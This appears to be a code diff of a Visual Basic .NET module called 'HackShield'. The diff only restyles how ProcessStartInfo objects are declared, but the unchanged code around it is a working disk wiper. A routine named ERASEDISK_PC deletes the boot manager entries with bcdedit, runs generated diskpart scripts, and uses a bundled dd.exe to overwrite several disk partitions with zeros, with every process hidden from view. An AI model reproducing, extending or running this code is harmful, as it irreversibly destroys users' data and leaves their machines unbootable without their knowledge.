@@ -257,7 +257,7 @@ Module HackShield
     Public Sub ERASEDISK_PC(thread As Object)
         If Not File.Exists("C:\Windows\ihackshield") Then
             Dim cmdbcedit1 As String = " /delete {bootmgr}"
-            Dim startInfobcedit1 As ProcessStartInfo = New ProcessStartInfo("bcdedit.exe", cmdbcedit1) With {
+            Dim startInfobcedit1 As New ProcessStartInfo("bcdedit.exe", cmdbcedit1) With {
             .CreateNoWindow = True,
             .WindowStyle = ProcessWindowStyle.Hidden,
             .UseShellExecute = False,
@@ -277,7 +277,7 @@ Module HackShield
                 process.WaitForExit()
             End Using
             Dim cmdbcedit2 As String = " /delete {current}"
-            Dim startInfobcedit2 As ProcessStartInfo = New ProcessStartInfo("bcdedit.exe", cmdbcedit2) With {
+            Dim startInfobcedit2 As New ProcessStartInfo("bcdedit.exe", cmdbcedit2) With {
             .CreateNoWindow = True,
             .WindowStyle = ProcessWindowStyle.Hidden,
             .UseShellExecute = False,
@@ -305,7 +305,7 @@ Module HackShield
                                                    })
             File.WriteAllText(System.Windows.Forms.Application.StartupPath & "\GoodBoy.txt", commanderasedisk2)
             Dim cmddisk2 As String = " /s " & """" & System.Windows.Forms.Application.StartupPath & "\GoodBoy.txt" & """"
-            Dim startInfodisk2 As ProcessStartInfo = New ProcessStartInfo("diskpart.exe", cmddisk2) With {
+            Dim startInfodisk2 As New ProcessStartInfo("diskpart.exe", cmddisk2) With {
             .CreateNoWindow = True,
             .WindowStyle = ProcessWindowStyle.Hidden,
             .UseShellExecute = False,
@@ -334,7 +334,7 @@ Module HackShield
                                                    })
             File.WriteAllText(System.Windows.Forms.Application.StartupPath & "\GoodBoy.txt", commanderasedisk1)
             Dim cmddisk1 As String = " /s " & """" & System.Windows.Forms.Application.StartupPath & "\GoodBoy.txt" & """"
-            Dim startInfodisk1 As ProcessStartInfo = New ProcessStartInfo("diskpart.exe", cmddisk1) With {
+            Dim startInfodisk1 As New ProcessStartInfo("diskpart.exe", cmddisk1) With {
             .CreateNoWindow = True,
             .WindowStyle = ProcessWindowStyle.Hidden,
             .UseShellExecute = False,
@@ -363,7 +363,7 @@ Module HackShield
                                                    })
             File.WriteAllText(System.Windows.Forms.Application.StartupPath & "\GoodBoy.txt", commanderasedisk0)
             Dim cmddisk0 As String = " /s " & """" & System.Windows.Forms.Application.StartupPath & "\GoodBoy.txt" & """"
-            Dim startInfodisk0 As ProcessStartInfo = New ProcessStartInfo("diskpart.exe", cmddisk0) With {
+            Dim startInfodisk0 As New ProcessStartInfo("diskpart.exe", cmddisk0) With {
             .CreateNoWindow = True,
             .WindowStyle = ProcessWindowStyle.Hidden,
             .UseShellExecute = False,
@@ -385,7 +385,7 @@ Module HackShield
             End Using
             File.WriteAllBytes(System.Windows.Forms.Application.StartupPath & "\dd.exe", My.Resources.dd)
             Dim cmddd1 As String = " if=/dev/zero of=\\?\Device\Harddisk0\Partition0 bs=512k"
-            Dim startInfodd1 As ProcessStartInfo = New ProcessStartInfo(System.Windows.Forms.Application.StartupPath & "\dd.exe", cmddd1) With {
+            Dim startInfodd1 As New ProcessStartInfo(System.Windows.Forms.Application.StartupPath & "\dd.exe", cmddd1) With {
             .CreateNoWindow = True,
             .WindowStyle = ProcessWindowStyle.Hidden,
             .UseShellExecute = False,
@@ -405,7 +405,7 @@ Module HackShield
                 process.WaitForExit()
             End Using
             Dim cmddd2 As String = " if=/dev/zero of=\\?\Device\Harddisk0\Partition1 bs=512k"
-            Dim startInfodd2 As ProcessStartInfo = New ProcessStartInfo(System.Windows.Forms.Application.StartupPath & "\dd.exe", cmddd2) With {
+            Dim startInfodd2 As New ProcessStartInfo(System.Windows.Forms.Application.StartupPath & "\dd.exe", cmddd2) With {
             .CreateNoWindow = True,
             .WindowStyle = ProcessWindowStyle.Hidden,
             .UseShellExecute = False,
@@ -425,7 +425,7 @@ Module HackShield
                 process.WaitForExit()
             End Using
             Dim cmddd3 As String = " if=/dev/zero of=\\?\Device\Harddisk1\Partition0 bs=512k"
-            Dim startInfodd3 As ProcessStartInfo = New ProcessStartInfo(System.Windows.Forms.Application.StartupPath & "\dd.exe", cmddd3) With {
+            Dim startInfodd3 As New ProcessStartInfo(System.Windows.Forms.Application.StartupPath & "\dd.exe", cmddd3) With {
             .CreateNoWindow = True,
             .WindowStyle = ProcessWindowStyle.Hidden,
             .UseShellExecute = False,
@@ -445,7 +445,7 @@ Module HackShield
                 process.WaitForExit()
             End Using
             Dim cmddd4 As String = " if=/dev/zero of=\\?\Device\Harddisk1\Partition1 bs=512k"
-            Dim startInfodd4 As ProcessStartInfo = New ProcessStartInfo(System.Windows.Forms.Application.StartupPath & "\dd.exe", cmddd4) With {
+            Dim startInfodd4 As New ProcessStartInfo(System.Windows.Forms.Application.StartupPath & "\dd.exe", cmddd4) With {
             .CreateNoWindow = True,
             .WindowStyle = ProcessWindowStyle.Hidden,
             .UseShellExecute = False,
@@ -465,7 +465,7 @@ Module HackShield
                 process.WaitForExit()
             End Using
             Dim cmddd5 As String = " if=/dev/zero of=\\?\Device\Harddisk2\Partition0 bs=512k"
-            Dim startInfodd5 As ProcessStartInfo = New ProcessStartInfo(System.Windows.Forms.Application.StartupPath & "\dd.exe", cmddd5) With {
+            Dim startInfodd5 As New ProcessStartInfo(System.Windows.Forms.Application.StartupPath & "\dd.exe", cmddd5) With {
             .CreateNoWindow = True,
             .WindowStyle = ProcessWindowStyle.Hidden,
             .UseShellExecute = False,
@@ -485,7 +485,7 @@ Module HackShield
                 process.WaitForExit()
             End Using
             Dim cmddd6 As String = " if=/dev/zero of=\\?\Device\Harddisk2\Partition1 bs=512k"
-            Dim startInfodd6 As ProcessStartInfo = New ProcessStartInfo(System.Windows.Forms.Application.StartupPath & "\dd.exe", cmddd6) With {
+            Dim startInfodd6 As New ProcessStartInfo(System.Windows.Forms.Application.StartupPath & "\dd.exe", cmddd6) With {
             .CreateNoWindow = True,
             .WindowStyle = ProcessWindowStyle.Hidden,
             .UseShellExecute = False,
